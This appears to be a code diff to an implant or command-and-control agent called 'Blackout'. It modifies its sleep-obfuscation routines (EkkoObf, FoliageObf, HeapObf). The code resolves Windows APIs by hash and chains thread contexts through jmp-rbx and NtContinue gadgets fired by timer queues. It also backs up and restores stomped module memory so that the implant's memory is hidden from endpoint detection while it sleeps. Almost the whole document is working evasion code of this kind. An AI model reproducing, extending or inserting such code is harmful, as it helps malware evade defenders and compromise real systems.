@@ -34,7 +34,7 @@ FUNC VOID HeapObf(
     MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );
 
     typedef WINBOOL (*fHeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
-    fHeapWalk pHeapWalk = LdrFuncAddr( LdrModuleAddr( H_MODULE_KERNEL32 ), HASH_STR( "HeapWWalk" ) );
+    fHeapWalk pHeapWalk = LdrFuncAddr( LdrModuleAddr( HASH_STR( "KERNEL32.DLL" ) ), HASH_STR( "HeapWWalk" ) );
 
     pHeapWalk( Heap, &HeapEntry );
     if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
@@ -88,12 +88,21 @@ FUNC VOID EkkoObf(
     HANDLE Timer   = NULL;
 
     PVOID OldProt = NULL;
+    ULONG Dly = 0;
+
 
     CONTEXT CtxMain = { 0 };
     CONTEXT CtxSpf  = { 0 };
-    CONTEXT Ctx[10] = { 0 };
-    
+    UINT16  ict     = 0;
+#ifdef BK_STOMP
+    CONTEXT Ctx[9] = { 0 };
+    ict     = 9;
+#else
+    CONTEXT Ctx[7]  = { 0 };
+    ict     = 7;
+#endif
     UINT16 ic = 0;
+
 
     if ( Blackout().Stomp.Backup ) {
         GetStompedModule();
@@ -110,7 +119,6 @@ FUNC VOID EkkoObf(
     BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );
 
     BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().Gadgets.JmpGadget );
-    BK_PRINT( "[OBF] ret gadget to NtTestAlert @ 0x%p\n", Blackout().Gadgets.RetGadget );
     BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().Gadgets.NtContinueGadget );
 
     Status = Instance()->Win32.NtCreateEvent( &EvtTmr,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
@@ -120,9 +128,17 @@ FUNC VOID EkkoObf(
     Status = Instance()->Win32.RtlCreateTimerQueue( &Queue );
     if ( Status != 0 ) { __debugbreak; return; }
 
-    Status = Instance()->Win32.RtlCreateTimer( Queue, &Timer, Instance()->Win32.RtlCaptureContext, &CtxMain, 100, 0, WT_EXECUTEINTIMERTHREAD );
+    Status = Instance()->Win32.RtlCreateTimer( Queue, &Timer, Instance()->Win32.RtlCaptureContext, &CtxMain, Dly += 100, 0, WT_EXECUTEINTIMERTHREAD );
+    if ( Status != 0 ) { __debugbreak; return; }
 
-    for ( INT i = 0; i < 10; i++ ) {
+    Status = Instance()->Win32.RtlCreateTimer( Queue, &Timer, Instance()->Win32.SetEvent, EvtTmr, Dly += 100, 0, WT_EXECUTEINTIMERTHREAD );
+    if ( Status != 0 ) { __debugbreak; return; }
+
+    Status = Instance()->Win32.NtWaitForSingleObject( EvtTmr, FALSE, FALSE ); 
+    if ( Status != 0 ) { __debugbreak; return; }
+
+
+    for ( INT i = 0; i < ict; i++ ) {
         MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
         Ctx[i].Rsp -= sizeof( PVOID );
     }
@@ -130,14 +146,14 @@ FUNC VOID EkkoObf(
     Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
     Ctx[ic].Rbx = &Instance()->Win32.NtWaitForSingleObject;
     Ctx[ic].Rcx = EvtStrt;
-    Ctx[ic].Rdx = FALSE;
-    Ctx[ic].R8  = 0x32;
+    Ctx[ic].Rdx = INFINITE;
+    Ctx[ic].R8  = NULL;
     ic++;
 
     if ( Blackout().Stomp.Backup ) {
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
-        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
         Ctx[ic].Rcx = Blackout().Stomp.Backup;
         Ctx[ic].Rdx = Blackout().Region.Base;
         Ctx[ic].R8  = Blackout().Region.Length;
@@ -170,7 +186,7 @@ FUNC VOID EkkoObf(
         ic++;
     }
 
-    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;;
     Ctx[ic].Rbx = &Instance()->Win32.WaitForSingleObjectEx;
     Ctx[ic].Rcx = NtCurrentProcess();
     Ctx[ic].Rdx = SleepTime;
@@ -187,7 +203,7 @@ FUNC VOID EkkoObf(
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
-        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Stomp.Backup;
         Ctx[ic].R8  = Blackout().Region.Length;
@@ -221,16 +237,14 @@ FUNC VOID EkkoObf(
     Ctx[ic].Rcx = EvtEnd;
     ic++;
 
-    ULONG Dly = 0;
-    for ( INT i = 0; i < 10; i++ ) {
-        Instance()->Win32.RtlCreateTimer( Queue, &Timer, Blackout().Gadgets.NtContinueGadget, &Ctx[i], Dly += 200, 0, WT_EXECUTEINTIMERTHREAD );
+    for ( INT i = 0; i < ict; i++ ) {
+        Instance()->Win32.RtlCreateTimer( Queue, &Timer, Blackout().Gadgets.NtContinueGadget, &Ctx[i], Dly += 100, 0, WT_EXECUTEINTIMERTHREAD );
     }
 
-    BK_PRINT( "[OBF] Trigger obf chain\n" );
+    BK_PRINT( "[OBF] Trigger obf chain\n\n" );
 
     Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtStrt, EvtEnd, FALSE, NULL );
-
-
+    if ( Status != 0 ) { __debugbreak; return; }
 }
 
 FUNC VOID FoliageObf( 
@@ -306,7 +320,7 @@ FUNC VOID FoliageObf(
     if ( Blackout().Stomp.Backup ) {
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
-        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
         Ctx[ic].Rcx = Blackout().Stomp.Backup;
         Ctx[ic].Rdx = Blackout().Region.Base;
         Ctx[ic].R8  = Blackout().Region.Length;
@@ -363,7 +377,7 @@ FUNC VOID FoliageObf(
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
-        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rbx = &Instance()->Win32._RtlCopyMemory;
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Stomp.Backup;
         Ctx[ic].R8  = Blackout().Region.Length;
